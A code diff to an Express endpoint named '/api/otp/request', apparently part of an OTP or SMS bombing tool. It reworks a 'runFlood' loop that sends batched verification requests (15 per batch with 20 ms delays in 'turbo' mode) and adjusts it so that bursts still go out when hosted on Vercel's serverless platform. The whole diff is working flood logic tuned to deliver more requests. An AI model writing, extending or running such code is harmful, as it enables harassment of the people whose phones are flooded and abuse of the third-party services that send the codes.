@@ -78,22 +78,42 @@ app.post("/api/otp/request", async (req, res) => {
       }
     };
 
-    // Responsive Batching
+    // Execution
     const batchSize = isTurbo ? 15 : 5;
     const delay = isTurbo ? 20 : 500;
 
-    // Execute in background
-    (async () => {
+    // IMPORTANT: In serverless (Vercel), we must wait for at least one batch
+    // otherwise the process is killed before any requests are sent.
+    const runFlood = async () => {
       for (let i = 0; i < requestCount; i += batchSize) {
         const p = Array.from({ length: Math.min(batchSize, requestCount - i) }).map(() => fireRequest());
         await Promise.all(p);
-        if (i + batchSize < requestCount) await new Promise(r => setTimeout(r, delay));
+        if (i + batchSize < requestCount) {
+          // If we are on Vercel, we can't wait too long
+          if (process.env.VERCEL && i > 30) break; 
+          await new Promise(r => setTimeout(r, delay));
+        }
       }
-    })().catch(e => console.error("[WORKER_ERR]", e));
+    };
+
+    if (process.env.VERCEL) {
+      // On Vercel, wait for a small burst to ensure delivery
+      await Promise.all(Array.from({ length: Math.min(3, requestCount) }).map(() => fireRequest()));
+      // Non-blocking for the rest (might be killed, but at least some went through)
+      runFlood().catch(e => console.error("[WORKER_ERR]", e));
+    } else {
+      // On standard servers, we can run the whole thing in background
+      runFlood().catch(e => console.error("[WORKER_ERR]", e));
+    }
 
     res.json({
       status: "STABLE",
-      metadata: { session_id: seedHash, packets: requestCount, protocol: "V5.6-PRO-SYNC" }
+      metadata: { 
+        session_id: seedHash, 
+        packets: requestCount, 
+        protocol: "V5.7-HYPER-SYNC",
+        platform: process.env.VERCEL ? "serverless_restricted" : "persistent"
+      }
     });
   } catch (err) {
     console.error("[CRITICAL] API Error:", err);
